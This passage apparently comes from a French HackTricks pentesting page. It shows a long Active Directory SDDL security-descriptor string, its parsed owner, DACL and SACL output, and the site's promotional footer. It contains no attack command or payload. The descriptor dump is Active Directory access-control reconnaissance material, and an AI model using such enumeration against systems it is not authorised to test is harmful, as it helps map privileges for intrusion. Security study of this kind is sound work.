;CI;CC;5cb41ed0-0e4c-11d0-a286-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;RP;4c164200-20c0-11d0-a768-00aa006e0529;;S-1-5-21-3842939050-3880317879-2865463114-5181)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;9a7ad945-ca53-11d1-bbd0-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967991-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a0a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;9a9a021e-4a5b-11d1-a9c3-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;0296c120-40da-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;934de926-b09e-11d2-aa06-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5e353847-f36c-48be-a7f7-49685402503c;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;8d3bca50-1d7e-11d0-a081-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;e48d0154-bcf8-11d1-8702-00c04fb96050;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;275b2f54-982d-4dcd-b0ad-e53501445efb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5fd42471-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5430e777-c3ea-4024-902e-dde192204669;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;6f606079-3a82-4c1b-8efb-dcc8c91d26fe;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a7a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;bf967a7f-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;614aea82-abc6-4dd0-a148-d67a59c72816;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;66437984-c3c5-498f-b269-987819ef484b;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;2cc06e9d-6f7e-426a-8825-0215de176e11;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;3263e3b8-fd6b-4c60-87f2-34bdaa9d69eb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf9679c0-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e0abfd0-126a-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;7cb4c7d3-8787-42b0-b438-3c5d479ad31e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-526)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-527)(OA;CI;DTWD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;DTWD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CCDCLCRPWPLO;f0f8ffac-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;CCDCLCRPWPLO;e8b2aff2-59a7-4eac-9a70-819adef701dd;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aa5-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;5cb41ed0-0e4c-11d0-a286-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;WD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;CO)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;c975c901-6cea-4b6f-8319-d67f45449506;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;f0f8ffac-1191-11d0-a060-00aa006c33ed;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CINPIO;RPWPLOSD;;e8b2aff2-59a7-4eac-9a70-819adef701dd;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;NS)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;AU)(OA;CI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;LCSWRPWPRC;;;S-1-5-21-3842939050-3880317879-2865463114-5213)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5172)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5187)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3842939050-3880317879-2865463114-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;CI;LCRPWPRC;;;AN)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)"
Propri√©taire            : BUILTIN\Administrateurs
Groupe            : BUILTIN\Administrateurs
DiscretionaryAcl : {Everyone: Acc√®s refus√© (WriteData), Everyone: Acc√®s autoris√© (WriteExtendedAttributes), NT
AUTHORITY\ANONYMOUS LOGON: Acc√®s autoris√© (CreateDirectories, GenericExecute, ReadPermissions,
Traverse, WriteExtendedAttributes), NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS: Acc√®s autoris√©
(CreateDirectories, GenericExecute, GenericRead, ReadAttributes, ReadPermissions,
WriteExtendedAttributes)...}
SystemAcl        : {Everyone: Audit syst√®me Acc√®s r√©ussi (ChangePermissions, TakeOwnership, Traverse),
BUILTIN\Administrateurs: Audit syst√®me Acc√®s r√©ussi (WriteAttributes), DOMAIN_NAME\Domain Users:
Audit syst√®me Acc√®s r√©ussi (WriteAttributes), Everyone: Audit syst√®me Acc√®s r√©ussi
(Traverse)...}
RawDescriptor    : System.Security.AccessControl.CommonSecurityDescriptor
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
